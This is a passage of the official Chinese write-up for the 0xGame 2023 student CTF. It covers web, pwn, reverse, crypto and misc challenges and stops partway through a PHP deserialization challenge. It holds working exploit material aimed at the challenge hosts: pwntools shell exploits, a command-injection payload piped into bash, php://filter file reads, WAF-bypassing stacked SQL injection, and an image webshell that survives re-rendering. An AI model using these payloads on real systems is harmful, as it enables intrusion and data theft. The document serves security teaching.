# 0xGame 2023 Official Writeup

[toc]

## Week 1

### Web

#### signin

考点是 sourcemap 泄露

F12 - 源代码/来源, 找到 /src/main.js

![image-20230928145713537](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021205691.png)

当然也能看 `/assets/index-33309f51.js` 的最后一行

```
//# sourceMappingURL=index-33309f51.js.map
```

访问 `/assets/index-33309f51.js.map` 然后全局搜索 `0xGame` 关键词即可

#### hello_http

http 协议基础知识

```http
POST /?query=ctf HTTP/1.1
Host: localhost:8012
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: HarmonyOS Browser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: role=admin
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Referer: ys.mihoyo.com
Content-Length: 14

action=getflag
```

#### repo_leak

Notice 提示 `Using Git for version control`, 存在 `.git` 泄露

```bash
githacker --url http://localhost:8013/ --output-folder test
```

`git commit` 查看历史 commits

![image-20230928150100762](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021205710.png)

回退到上一个版本

```bash
git reset --hard HEAD^
```

本地再起一个 http server 就能看到 flag 了

![image-20230928150214666](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021206746.png)

或者对着本地文件嗯搜也行

#### baby_php

首先是 PHP md5 0e 的弱类型比较,  `0e123213` 会被当做科学计数法, 类型转换之后就是 `0`

然后需要绕过 `is_numeric` 和 `intval`

`is_numeric` 如果包含一些乱七八糟的东西比如空格, 字母之类的就会返回 False

`intval` 在类型转换的时候会取整, 因此可以加个小数点, 并且 intval 也会截断非数字的部分

最后是 PHP 伪协议的利用, 需要用 `php://filter` 的过滤器将 flag.php 的内容进行 base64 编码, 最后解码就能拿到 flag

```http
POST /?a=240610708&b=s878926199a HTTP/1.1
Host: localhost:8014
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: name=php://filter/read=convert.base64-encode/resource=flag
Content-Length: 9

c=1024.1a
```

这里需要注意 `name=flag` 并不会拿到 flag, 因为 include 的本质就是执行某个 php 文件, `include('flag.php')` 跟你直接拿浏览器去访问 flag.php 没有任何区别

flag.php 的内容如下

```php
<?php
$flag = 'xxx';
?>
```

include 之后程序只是定义了一个 `$flag` 变量, 也没有别的操作, 更别说查看 flag 了

正确的解法是用 `php://filter`, 将 flag.php 的内容进行 base64 编码, 然后传入 include

include 接受的内容如果以 `<?php` 开头, 则会把这段内容解析为 PHP 代码, 否则会将其视为纯文本, 啥也不干直接输出, 这也是为什么 base64 编码之后就能读到 flag.php 源码的原因

#### ping

右键源代码可以看到 hint

```
visit '/api.php?source' for hint
```

sanitize 函数会 replace 一些字符

 `;` 用 `%0a` 绕过, 空格用 `${IFS}` 绕过, `/` 以及 `flag` 用 base64 编码绕过 (网上参考文章很多)

然后 `preg_match` 会匹配一个 IP 的正则表达式, 但是正则前后并没有包含 `^...$`, 因此像 `test127.0.0.1test` 这种形式也能够通过检测

payload

```
ip=#127.0.0.1%0aecho${IFS}Y2F0IC9mbGFnCg==|base64${IFS}-d|bash
```

前端对 IP 的格式做了限制但是并没有什么用, F12 改一改或者直接用 burpsuite 发包就行

### Pwn

#### 前言

本次新生赛也是笔者第一次出题，确实在过程中发现了一些可以改进的地方，而且从解题情况来看确实出难了，确实对新人及其不友好。在这里给各位磕一个（咚

这里也带一笔入坑指南，之前觉得隔壁moe的比我写得好我就没写（

入门期的pwn题基本都围绕着linux中ELF程序栈溢出相关的利用，这种程序一般都用C语言来编写。

因而pwn的基础就多了起来：
+ C语言简单语法（到循环和函数即可，`malloc`及`glibc`堆是新手期之后的内容）
+ `linux`命令行简单使用（`ls`查看目录，`cat`查看文件，`/bin/sh`拿`shell`等）
+ linux程序栈的结构，变量是存储在栈上还是bss段上，库函数的调用过程。

不过这些都是计算机最底层的原理，也是二进制安全的必经之路。

下面正式进入题目WP。

#### 找不到且不对劲的flag

> 需要了解基本linux命令，linux隐藏文件

TL;DR：`ls -al && cd .secret && cat flag`

后话：应该在连上之后给个提示语的，比如`Here's your linux shell, try to find my secret.`之类的。

本题连上之后就会给一个linux的shell，你需要做的是在机器上找flag。

明面上的flag显然是假的，结合hint`真flag被我藏起来了。你知道linux下怎么藏东西吗？`想到隐藏文件，本题就通了。

#### 永远进不去的后门

> aka ret2text
>
> 需要了解一点点x86汇编，程序栈，ret2text
>
> hint: 显然世界上没有一个数可以满足x%2023=2023，但这个gets……那不就等于我想让他干什么就干什么？比如在[REDACTED]之后直接进入if条件成立的分支？

年轻人的第一道pwn。

call 指令一般在调用函数时使用，会将下一条指令地址push入栈，然后转到被调用函数执行，执行完成后把地址pop出来，继续执行原函数内容。

假设我们有修改这个被保存到栈中地址的能力，那我们显然就可以控制程序的执行流程了。

而`gets`可以输入以回车结尾，无限长度的内容。

这个题给了后门，直接跳过去即可。

```py
from pwn import *
context(arch="amd64",os="linux",log_level="debug")
s=remote("8.130.35.16",51002)
s.recv()
s.send(b"a"*0x48+p64(0x401298))
s.interactive()
```

#### 随便乱搞的shellcode

> 会shellcraft.sh()就可以梭，但你还需要知道一些机器可以执行的、没啥用的汇编指令，比如nop。

mmap开了一段内存区域让你写shellcode，且没有任何限制。

但是最后加了一个起始地址的随机化和关闭了标准输出（1）：

```c
    srand(time(0));
    shellcode_space+=rand()%0x100;
    close(1);
```

你只需要让shellcode贴着mmap区域末尾，然后把输出重定向到标准错误（2）或者标准输入（0）即可。

> 建议优先使用标准错误，高版本似乎标准输入只读

前面填充上一些干了但是等于啥也没干的指令，比如`nop`等。

```py
from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#s=process("../dist/ret2shellcode")
s=remote("192.168.3.253",51003)
#pause()
s.sendafter(b"code:\n",asm(shellcraft.sh()).rjust(0x100,b"\x90"))
s.sendline(b"exec 1>&2")
s.interactive()
```

#### 高端的syscall

> 需要了解系统调用、x64调用约定、如何传参。
>
> 还有ret2csu，跨架构、可以控制rdi,rsi,rdx三个寄存器和执行流
>
> 这个题如果你会ret2libc可以直接梭

rax存系统调用号，不多于6个参数按rdi,rsi,rdx,rcx,r8,r9顺序存放，多于6个按不同调用约定可能会正序或倒序入栈。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./ret2syscall")
s=remote("192.168.3.253",51004)
elf=ELF("../dist/ret2syscall")
rdi=0x00000000004012e3
rsi_r15=0x00000000004012e1
csu1=0x4012DA
csu2=0x4012C0
rax=0x401196
syscall=0x4011AE
#pause()
s.sendlineafter(b"Input: \n",flat([
    b"a"*0x18,
    rdi,0x404500,
    elf.plt.gets,
    rdi,0x3b,rax,
    csu1,0,1,0x404500,0,0,0x404508,
    csu2,
]))
#pause()
s.sendline(b"/bin/sh\x00"+p64(syscall))
s.interactive()
```

#### 我后门呢

> aka ret2libc
>
> 目前只要知道，`parital relro`下，调用库函数一次之后，`got`表中会存放`libc`相关地址即可。剩余内容可以参考[ctf-wiki](https://ctf-wiki.org/)。

泄露got表项，计算libc基址，然后打one_gadget（可以查一下）或者`flat([rdi,binsh,system])`都行

```py
from pwn import *
context(arch="amd64",os="linux",log_level="debug")
#s=process("./ret2libc")
s=remote("192.168.3.253",51005)
elf=ELF("../dist/ret2libc")
libc=ELF("../dist/libc.so.6")
s.recvuntil(b"input:\n")
rdi=0x0000000000401333
p=flat([
    b"\x00"*0x20,
    0x404000,
    rdi,elf.got.puts,
    elf.plt.puts,
    elf.sym.main,
])
s.sendline(p)
s.recvline()
libc.address=u64(s.recvline()[:-1].ljust(8,b"\x00"))-libc.sym.puts
success(hex(libc.address))
r12__r15=0x000000000040132c
p=flat([
    b"\x00"*0x20,
    0x404000,
    r12__r15,0,0,0,0,
    libc.address+0xe3afe,
])
s.sendline(p)
s.interactive()
```

#### got-it

> 延迟绑定，got表里存的究竟是啥
>
> 细节想问的直接私聊我吧

给了`exit("/bin/sh")`，bss上数组没有检查下界。

`show` got表项拿libc，把`exit`的got表改成`system`地址，最后走0x2023就可以拿shell了。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("./got-it")
s=remote("192.168.3.253",51006)
libc=ELF("../dist/libc.so.6")

def menu(ch):
    s.sendlineafter(b">> ",str(ch).encode())
def show(idx):
    menu(2)
    s.sendlineafter(b"id: ",str(idx).encode())
    s.recvuntil(b"name: ")
    return s.recvline()[:-1]
def edit(idx,name):
    menu(3)
    s.sendlineafter(b"id: ",str(idx).encode())
    s.sendafter(b"name: ",name)
dat=show(-17)
info(dat)
libc.address=u64(dat.ljust(8,b"\x00"))-libc.sym.puts
success(hex(libc.address))
edit(-11,p64(libc.sym.system)[:6])
menu(0x2023)
s.interactive()
```

#### 字符串和随机数

> 碎碎念：本来是当第二个签到题放的，结果好像成了第二持久的题（
>
> 而且不知道各位是否注意到本题libc为debian 11.7 （因为ubuntu的编译出来种子位置不能接在第一个输入后面，也就没法带出来种子）

主要想介绍一下字符串以0结尾，以及只要拿到种子就可以生成一模一样的随机数。

第一个输入如果发满的话可以带出来随机数种子。

用ctypes里的cdll可以加载libc库并使用其中的函数。

具体见脚本吧。

```py
from pwn import *
from ctypes import cdll
context(arch='amd64', os='linux',log_level='debug')
#s=process("../dist/pwn")
s=remote("192.168.3.253",51001)
clib=cdll.LoadLibrary("../dist/libc.so.6")

if __name__=="__main__":
    #sleep(5)
    s.sendafter(b"Name: ",b"admin".ljust(0x20,b"a"))
    s.sendafter(b"Password: ",b"1s_7h1s_p9ss_7tuIy_sAf3?")
    s.recvuntil(b"admin".ljust(0x20,b"a"))
    seed=u32(s.recv(4))
    clib.srand(seed)
    arg1=clib.rand()^0xd0e0a0d0
    info(hex(arg1))
    arg2=clib.rand()^0x0b0e0e0f
    info(hex(arg2))
    chal=(arg1^arg2)%1000000
    info(hex(chal))
    s.sendlineafter(b"Wanna see it?",b"y")
    s.sendlineafter(b"Input the security code to continue: ",str(chal).encode())
    s.interactive()
```

### Reverse

#### 数字筑基

根据程序要求，我们需要将如下内容转换为其十六进制形式。这里用到这个工具

[在线工具](https://gchq.github.io/CyberChef/) 

~~可能你需要能访问谷歌才可以打开这个工具~~。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717233896.png)

利用该工具拿到十六进制的字符串，输入程序，即可拿到flag。(题目描述的16进制形式可能存在歧义。最终输入应该是ASCII字符串(如30=='0'))

#### 代码金丹

拿到程序后，我们可以用IDA打开，F5反编译main函数后，可以看到如下内容

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717240577.png)

由此，得到flag

#### 网络元婴

拿到程序后，仿照第三题用IDA打开，F5反编译main函数后，可以看到如下内容。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717241959.png)

由此，可以将每一位拼接，从而获得flag，也可以动态调试，复制最终拼接好的flag。

#### 虚拟化神

拿到程序，运行发现是重启验证(输入注册码后不直接解锁功能，需要下次启动软件才会生效)。

观察可以发现，程序在验证完毕、重启之前会在同目录下创建config.txt。

根据其内容发现输入错误为0(false)，将其改为1(true)，再次运行程序，即可获得flag。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717243137.png)

当然，我们IDA分析一下也能发现，程序会解密出内置的flag，然后和输入进行比较，所以动态调试也可以拿到flag。

#### 赛博天尊

拿到程序，丢入IDA分析，可以看到如下结果

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717244336.png)

可以发现输入的flag按-分割，转换成整数后需要满足特定方程，提取出方程后求解即可。

```python
from sympy import symbols, Eq, solve

v7, v8, v9, v10, v11 = symbols('v7 v8 v9 v10 v11')

equations = [
    Eq(7 * v9 + 5 * (v8 + v11) + 2 * (v10 + 4 * v7), 0x12021DE669FC2),
    Eq(v9 + v10 + 2 * v10 + 2 * (v11 + v7) + v8, 0x159BFFC17D045 -
       2 * (v9 + v10 + 2 * v10 + 2 * (v11 + v7))),
    Eq(v10 + v9 + v11 + 2 * v9 + 2 * (v9 + v11 + 2 * v9) +
       2 * (v8 + 4 * v7), 0xACE320D12501),
    Eq(v8 + 2 * (v7 + v11 + v9 + 2 * v10), 0x733FFEB3A4FA),
    Eq(v8 + 7 * v11 + 8 * (v9 + v10) + 5 * v7, 0x1935EBA54EB28)
]

solutions = solve(equations)

sorted_solutions = {k: hex(v) for k, v in sorted(
    solutions.items(), key=lambda item: int(str(item[0])[1:]))}

formatted_sorted_hex_solution = f"0xGame{{{'-'.join([val[2:] for val in sorted_solutions.values()])}}}"

print(formatted_sorted_hex_solution)
```

运行如上脚本即可得到flag。

### Crypto

#### 觅码

考点：

+ python编程
+ 编码原理

碎碎念：这题的本意是想让大家熟悉一下python的语法，了解信息是如何编码成为一串数字，并进行一系列数学运算操作的，中文flag属实是有点抽象。这道题应该算是本周的签到题，但是解出的人数不太符合预期，在这里给大伙道歉了。该给出的函数都给出了，那么都配置好环境了，接下来的题目应该会顺利多了。

一些小坑：中文编码，因为c1,c2,c3,c4之间可能会有一些比特是连着的构成中文字符，所以单解出部分密文是无法直接decode的。考虑到这点，每串字符里面都有一些英文字符，告诉做题的师傅解出来的是正确的。

小知识：在python中的几个常用的数字表示类型有：

+ 十六进制(0x)开头数字
+ 八进制(0o)开头数字
+ 二进制(0b)开头数字
+ 十进制无特殊开头

在python中，用(b')做开头的表示bytes类型的数据，一个bytes大小为8bit。

几个常用的函数解释：

```python
from gmpy2 import iroot #引入函数库，用来开根用的，gmpy2里面有很多比较好用的密码算法可以使用，推荐使用。

long_to_bytes()#将数字类型的数据转换为bytes类型的数据，一个bytes占据8bit大小，那么0-256的一个数字，就可以表示一个bytes，因为在十进制下这个数字不太好直接书写表示，一般我们用十六进制去表示一个bytes，例如ascii码为65的字母'A'，表示为0x41，比特流b'AAA'表示的十六进制数就是0x414141。
bytes_to_long()#为上一个函数的逆操作。

encode()#将字符串编码成bytes数据，即：'0xGame'->b'0xGame'。
decode()#上一个函数的逆操作。

b64encode()#base64编码操作，作用和encode类似，但是由于算法的原因，其可以将不可打印字符编码成打印字符，具体算法流程可以参考“猜谜”，这道题的编码函数。
b64decode()#解base64编码。
```

有了上述这些工具基本就能解题了，题目给了三个数字，一个base64编码后的比特流，直接将相应的数字按照python识别数字的办法还原回去，然后long_to_bytes就完了。（不学会编码，接下来学习密码的路咋走嘛？）

exp:

```python
from gmpy2 import iroot
from Crypto.Util.number import *
from base64 import b64decode
c1 = 2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551
c2 = 10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100
c3 = b'lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ=='
c4 = 'e4bbace79a8443727970746fe68c91e68898e590a72121217d'

flag = (long_to_bytes(iroot(c1,5)[0])+long_to_bytes(eval('0b'+str(c2)))+b64decode(c3)+long_to_bytes(eval('0x'+str(c4)))).decode()
print(flag)
#0xGame{ 恭喜你,已经理解了信息是如何编码的，那么开始我们的Crypto挑战吧!!!}

```

#### RSA

考点：

+ RSA的基本概念
+ 欧拉函数定义
+ 逆元的运算与定义
+ 基本分解模数的工具应用

碎碎念：出的是有点杂，基本入门需要掌握的知识都含括在里面了，对初次接触密码领域的新朋友有点小坑。我们可以通过这题知道：逆元可以代替除法在有限域（某个模数下的式子）中进行运算，同时逆元不是百分百存在的（必须与模数互质）。所以题目中的逆元不能直接求出，这是这题的一个小坑。

虽然这个坑不太符合预期，大伙都能直接除以解出来就是了，就当做下降难度了，，，

思路：RSA概念网上已经很多了，应该也不是特别难懂，比较令新人烦恼的可能是(mod)这个概念，就是取余这个操作，慢慢适应就好了。这道题用yafu.exe，还是用factordb网站，或者是自己随便写写就能分解模数，拿到欧拉函数直接解逆元了，得到flag了。

exp:

```python
from Crypto.Util.number import *
n = 93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597
e = 65537
c = 54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801
mask=54257528450885974256117108479579183871895740052660152544049844968621224899247
fact=[2329990801,2436711469,2732757047,2770441151,2821163021,2864469667,2995527113,3111632101,3162958289,3267547559,3281340371,3479527847,3561068417,3978177241,4134768233,4160088337]
phi = 1
for i in fact:
	phi *= i-1
d = inverse(e,phi)
c =pow(c,d,n)
#这是在mask*m > n情况下的解法，虽然我看大伙直接除以就可以得到原文了，权当一种思路去应对以后见到的情况吧，，
mask_inv=(inverse(mask//GCD(mask,n),n)) 
c = c*mask_inv%n
m = long_to_bytes(c//GCD(mask,n))
print(m)
#b'0xGame{Magic_M@th_Make_Crypt0}'
```

#### Take my bag

考点：

+ 逆元的运用
+ 超递增数列
+ 加密算法至数学式子的推导

碎碎念：这题主要是背包密码，这里给出数学公式
$$
m=i_{n}i_{n-1}i_{n-2}······i_2i_1(i_k\in{1,0})\\
加密公式：\sum{3^{i_n}}*w=c(modn)
$$
解密逻辑：$w$已经给出，那么就很自然的可以考虑到用逆元做除法化简式子得到：
$$
c*w^{-1}=\sum{3^{m_{i_n}}}*w*w^{-1}=\sum{3^{m_{i}}}(modn)
$$
接下来通过尝试我们可以知道：
$$
n>\sum{3^n}\\
且有3^{n+1}>\sum{3^n}>3^{n-1}
$$
那么问题就很简单了，可能只需要对贪心算法有一点点了解，就可以直接写脚本了（如果对你来说贪心算法可能一时半会有点难以理解，或是没接触编程，不要紧，权当学习编程思想也是不错的选择。）

exp:

```python
from Crypto.Util.number import *

w=16221818045491479713
n=9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061
c=4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111
c = c*inverse(w,n)%n

def decrypt(c):
    index = 0
    m = 0
    while pow(3,index)<c:
        index+=1
    for i in range(index-1,-1,-1):
        if ((pow(3,i+1)>c)&(pow(3,i)<=c)):
            c -= pow(3,i)
            m += pow(2,i)
    return m

print(long_to_bytes(decrypt(c)))
#b'0xGame{Welc0me_2_Crypt0_G@me!#$&%}'
```

#### CBC

考点：

+ 对称加密中的分组模式
+ 密钥爆破

碎碎念：关于分组模式存在的原因，还望大家自行通过搜索引擎获取，一般的加密算法都是通过了世人的长久考验而留下来的，要想通过分析并攻破是及其困难的事情，但是由于分组模式不同而存在的某些缺陷却是可以利用的，在进行更深一步的探索之前，我想通过基本的概念题，让大家理解这个分组是怎么操作的、并有哪些好处和缺陷。关于解密脚本的编写入门，可能对新人不是那么友好，但是通过观察流程图可以发现，很多操作只要看懂了是可以硬抄的，就没啥太大的难度了，那么这题给出两种解法。

exp1:

可以观察得到，密钥空间并不是很大，可以通过穷举爆破的办法一个个尝试得到，接下来写出基本的CBC解密脚本就可以。

```python
from Crypto.Util.number import *

def bytes_xor(a,b):
	a,b=bytes_to_long(a),bytes_to_long(b)
	return long_to_bytes(a^b)

def decrypt(text,key):
	result = b''
	for i in text:
		result += ((i^key)).to_bytes(1,'big')
	return result

def CBCinv(enc,iv,key):
	result = b''
	block=[enc[_*8:(_+1)*8] for _ in range(len(enc)//8)]
	for i in block:
		temp = decrypt(i,key)
		tmp = bytes_xor(iv,temp)
		iv = i
		result += tmp
	return result

iv = b'11111111'
enc = enc = b"\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f>7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o'D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d{\\TV\x10\x11"
for key in range(0xff):
	dec = (CBCinv(enc,iv,key))
	if b'0xGame' in dec:
		print(dec)
#b'0xGame{098f6bcd4621d373cade4e832627b4f6}\x08\x08\x08\x08\x08\x08\x08\x08'
#后面的填充部分就懒得去掉了，，
```

exp2:

因为已知明文、密钥固定的特点，这里利用了CBC分组模式的特点可以直接逆推出密钥，在这里给出这种解法，目的是让新师傅了解一下利用已知明文解密的这种思想。

```python
iv = b'11111111'
enc = b"\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f>7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o'D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d{\\TV\x10\x11"
test = b'0xGame'
key = (iv[0]^test[0]^enc[0])

dec = CBCinv(enc,iv,key)
print(dec)
#b'0xGame{098f6bcd4621d373cade4e832627b4f6}\x08\x08\x08\x08\x08\x08\x08\x08'
```

#### 猜谜

考点：

+ 已知明文攻击

+ base64编码算法

碎碎念：考虑到难度，当天还是放出了魔改base64解码函数，通过编码可以将不可打印字符转换成可打印字符(A-Z\a-z\0-9\\\\+\)，以便于在网络传输中显示，随便写的算法就看个乐呵就行。重点是已知明文攻击这部分：如果我们知道了部分明文的情况下，可以通过一定的推导得到部分密钥的信息、甚至是密钥，这在密码学中是一个重要的攻击思想。

在这里我们可以知道，一般的正常加解密算法是难以攻破的，如果我们能在现实中通过侧信道攻击，获取了某些关键的信息呢？

exp:

```python
from Crypto.Util.number import *

def dec(text):
	text = text.decode()
	code = 'AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS'
	unpad = 0
	tmp = ''
	if (text[-1] == '=') & (text[-2:] != '=='):
		text = text[:-1]
		unpad = -1
	if text[-2:] == '==':
		text = text[:-2]
		unpad = -2
	for i in text:
		tmp += str(bin(code.index(i)))[2:].zfill(3)
	tmp = tmp[:unpad]
	result = long_to_bytes(int(tmp,2))
	return result

c = b'IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx='
enc = dec(c)

mask = b''
kown = b'0xGame{'
for i in range(7):
	mask += (enc[i]^(kown[i]+i)).to_bytes(1,'big')
flag = b''
for i in range(len(enc)):
	flag +=((mask[i%7]^enc[i])-i).to_bytes(1,'big')
print(flag)
#b'0xGame{Kn0wn_pl@intext_Att@ck!}'
```

#### 维吉尼亚密码

这道古典密码题很简单，有不少师傅甚至直接猜都能猜得出密钥是啥（Game），在目前的CTF赛事中古典密码的题已经很少了。这种传统的加密技术中，就算猜不到密钥是啥，通过统计某些密文和密钥的规律基本都能还原信息。WP就不想写了，，

#### 废话

确实不可否认的是，第一周我弄得题不是很简单，基本都要沾点python编程，对想入门密码、或者是想尝试CTF的哥们不友好。

但是核心思路都非常简单，而且脚本的编写也不会太复杂（要么可以直接抄题目给的部分代码，要么就是想一下就出来了），因为我并不太想看到新人能够在第一周疯狂上分，然后到后面遇到比较复杂的题就开始放弃了，试着适应可能比较好。

秉持这个态度出题（思路唯一），，相信经过第一周的师傅对密码这个方向有一个初步的认识。那么既然坚持下来了，就开始试着去破译一些好玩的算法吧。

### Misc

#### SignIn

一层base64一层base32

cyberchef直接解密

![](https://pic.imgdb.cn/item/65489498c458853aef620a31.jpg)

#### 重生之我在教学楼打cs

bsp文件再结合题目名可以搜索到是cs的地图，尝试之后可以用cs1.6打开

flag在警家鼎的脚下

颜色太浅了，我的

![](https://pic.imgdb.cn/item/654894c9c458853aef6285eb.jpg)

#### shark shark

通过协议以及追踪tcp.stream eq 0可以看出是一段ftp流量

传输的数据在tcp.stream eq 4

![](https://pic.imgdb.cn/item/654894e8c458853aef62d34d.jpg)

由504b0304开头得知这是一个压缩包的hex

于是复制出来cyberchef直接转换并且保存

![](https://pic.imgdb.cn/item/654894f9c458853aef62fcba.jpg)

使用先前登录ftp的密码，即very_safe_password即可解开压缩包拿到flag

#### hide and seek

steghide隐写弱口令爆破

使用rockyou.txt

![](https://pic.imgdb.cn/item/65489516c458853aef63483c.jpg)

#### least and most

由题目名可得知本题考查的是两种隐写方式

least significant bit和most significant bit

使用stegsolve工具即可解决

![](https://pic.imgdb.cn/item/65489532c458853aef6390d1.jpg)

![](https://pic.imgdb.cn/item/65489541c458853aef63bb23.jpg)

#### another signin

exp.sol:

```
pragma solidity ^0.8.0;
interface Greeter {
	function setGreeting(string memory _greeting) external;
	function isSolved() external;
}
contract attack {
	Greeter gre;
	constructor(address addr) {
		gre = Greeter(addr);
	}
	function hack(string memory _greet) external {
		gre.setGreeting(_greet);
		gre.isSolved();
	}
}
```

填入生成好的目标合约地址部署起来之后在hack里面填入Love0xGame再进行调用即可

## Week 2

### Web

#### ez_sqli

考察 MySQL 堆叠注入 + 预处理语句绕过 WAF

黑名单过滤了常见的 SQL 关键词, 正常没办法进行 SQL 注入, sqlmap 也跑不出来

首先得知道 mysqlclient (MySQLdb) 的 cursor.execute() 支持执行多条 SQL 语句, 这个也给了 hint

然后, MySQL 支持 SQL 语句的预处理 (set prepare execute), 这个网上搜搜也能找到对应的文章和 payload

```sql
prepare stmt from 'SELECT * FROM users WHERE id=?';
set @id=1;
execute stmt using @id;
```

那么就可以结合这个特性去绕过 WAF

代码我特地开了 debug 模式, 这样方便通过报错注入直接回显数据, 当然也可以用时间盲注, 或者一些其它的方式, 比如直接 insert flag

因为利用 updatexml 报错注入会有长度限制, 所以使用 substr 截取 flag 内容

```sql
# step 1
select updatexml(1,concat(0x7e,(select substr((select flag from flag),1,31)),0x7e),1);
# step 2
select updatexml(1,concat(0x7e,(select substr((select flag from flag),31,99)),0x7e),1);
```

payload

```sql
# step 1
id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt;
# step 2
id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c33312c393929292c30783765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt;
```

#### ez_upload

upload.php 通过 content-type 判断图片类型并调用对应的 imagecreatefromXXX 和 imgXXX 函数, 这些函数来自 PHP GD 库, 这个库主要负责处理图片

题目的功能其实是个简单的 "二次渲染", 二次渲染就是指服务端对用户上传的图片进行了二次处理, 例如图片的裁切, 添加水印等等

如果只是在图片的末尾简单的添加了 PHP 代码并上传, 那么经过二次渲染之后的图片是不会包含这段代码的, 因此需要去找一些绕过 GD 库二次渲染的脚本, 然后再构造图片马

https://xz.aliyun.com/t/2657

以 PNG 为例, 直接引用上面文章中的脚本

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

上传生成的 1.png 即可, 注意修改文件后缀和 content-type (题目并没有限制文件后缀, 只有二次渲染这一个考点)

![image-20230929153035390](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021206989.png)

#### ez_unserialize

考察 PHP 反序列化 POP 链的构造以及 wakeup 的绕过

首先全局找 `__destruct` 方法 (入口点),  也就是 DataObject

```php
class DataObject {
    public $storage;
    public $data;

    public function __destruct() {
        foreach ($this->data as $key => $value) {
            $this->storage->$key = $value;
        }
    }
}
```

遍历 data 的内容, 将 key 和 value 赋值给 storage, 触发 Storage 的 `__set` 方法

```php
class Storage {
    public $store;

    public function __construct() {
        $this->store = array();
    }
    
    public function __set($name, $value) {
        if (!$this->store) {
            $this->store = array();
        }

        if (!$value->expired()) {
            $this->store[$name] = $value;
        }
    }

    public function __get($name) {
        return $this->data[$name];
    }
}
```

如果 store 为空则初始化一个空的 array, 然后调用 value 的 expired 方法, 如果返回 False, 则会将 value 放入 store

Cache 类

```php
class Cache {
    public $key;
    public $value;
    public $expired;
    public $helper;

    public function __construct($key, $value, $helper) {
        $this->key = $key;
        $this->value = $value;
        $this->helper = $helper;

        $this->expired = False;
    }

    public function __wakeup() {
        $this->expired = False;
    }

    public function expired() {
        if ($this->expired) {
            $this->helper->clean($this->key);
            return True;
        } else {
            return False;
        }
    }
}
```

expired 方法会判断内部的 expired 属性是否为 True (注意区分, 一个是方法名一个是类的属性名), 如果为 True 则会调用 helper 的 clean 方法 (实际是 `__call` 方法)

Help 类

```php
class Helper {
    public $funcs;

    public function __construct($funcs) {
